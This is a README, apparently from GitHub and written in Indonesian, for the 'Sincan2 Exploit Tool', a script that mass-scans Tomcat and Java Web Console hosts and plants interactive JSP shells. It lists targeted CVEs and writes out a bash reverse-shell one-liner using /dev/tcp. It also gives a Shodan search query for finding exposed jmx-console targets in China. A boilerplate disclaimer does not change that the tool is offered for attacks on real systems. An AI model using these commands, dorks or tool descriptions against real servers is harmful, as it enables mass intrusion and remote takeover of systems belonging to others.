# 🛠️ Sincan2 Exploit Tool v3.4.1

> **by MHL TEAM**  
> Framework eksploitasi interaktif untuk vektor Java Web Console, Apache Tomcat, dan berbagai CVE modern.

![Screenshot](demo.png)

---

## 🚀 Fitur Utama

- 🎯 Scan satu IP atau massal dari file
- 🧠 Deteksi CVE modern secara otomatis
- 💣 Eksploitasi otomatis shell JSP interaktif
- 📁 Stateful scanning: hasil sukses disimpan & IP dihapus

---

## 🔍 Dukungan CVE

- CVE-2022-0853 — ROP Memory Leak  
- CVE-2023-5379 — Undertow Overflow  
- CVE-2023-1397 — DoS 8MB  
- CVE-2023-6236 — Spoofed JSON  
- CVE-2025-24813 — Tomcat Path Traversal

---

## 📦 Cara Pakai

```bash
bash sodok.sh
```

Ikuti menu interaktif:

- `[1]` Scan satu IP
- `[2]` Scan dari file (`koped.txt`)
- `[3]` Keluar

---

## 🧾 Output Shell

```bash
Target Shell: http://IP/jexws4/jexws4.jsp
Reverse Shell: /bin/bash -i >& /dev/tcp/IPMU/PORT 0>&1
Dork : cari target nya dus : https://www.shodan.io/search?query=%22jmx-console%22+country%3A%22CN%22
```

---

## ⚠️ Disclaimer

Tool ini hanya untuk penggunaan sah dalam penetration testing & edukasi.  
Segala penyalahgunaan adalah tanggung jawab pengguna.

---

## 🤝 Kontribusi

BY Sincan2 MHL Team.

---

## 📫 Kontak

📧 Tim MHL: `sincan2@gmail.com`  
🔗 GitHub: [github.com/sincan2](https://github.com/sincan2)
